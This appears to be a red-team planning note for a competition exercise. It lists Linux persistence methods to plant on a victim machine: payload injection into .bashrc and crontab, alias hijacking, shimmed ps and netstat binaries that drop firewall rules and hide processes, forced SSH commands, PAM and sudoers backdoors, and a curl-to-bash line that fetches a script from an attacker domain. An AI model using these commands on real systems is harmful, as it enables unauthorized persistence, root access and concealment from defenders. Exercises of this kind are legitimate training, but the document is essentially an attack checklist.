(pre-stage) Make sure to talk with the grey team and setup the correct ip address
for the callbacks 

1. Prebake, use a tar file to transfer over and tar -xvf 

2. Run setup to install necessary tools in the victim machine  

3. Run deploy to deploy all the payloads 
    
4. Setup server on the attacker machine and hope for all the callbacks to come 

===============================================================================

Deploy setting 

1. client binary 
2. deployment script 

===============================================================================
Payload lists 

Should probably parse all the user in the system 

1. .bashrc
    - sed -i '<linenum> a <payload>' /root/.bashrc
        - I mean this works, but it only appends to root
2. alias 
    - ls --> ls; <payload> 
    
3. shimmed binaries 
    - ps, netstat   --> drop iptables + grep -v python
    - The "shimmed" binary (bash_script) will simply drop firewall rule, run ps + grep -v python 
    - So the shim in this case doesn't need to be a c compiled file <-- Even tho it might be better... 

4. cronjob 
    - crontab -l | { cat; echo "<payload>"; } | crontab -

5. bash logout 
    - 

6. service 
    - https://medium.com/@benmorel/creating-a-linux-service-with-systemd-611b5c8b91d6
    
7. Just run the god damn binary dude 
8. Webshell pog? 

9. SSH Misconfiguration --> Overwrite sshdconfig 
    - ForceCommand "<payload>"
10. PAM backdoor 
11. SSH key? POG? 
12. sudoers backdoor (ex. ALL ALL=(ALL)NOPASSWD:ALL >> /etc/sudoers 

13. Reverse Web 
curl <evil_domain>/evil.sh | bash 
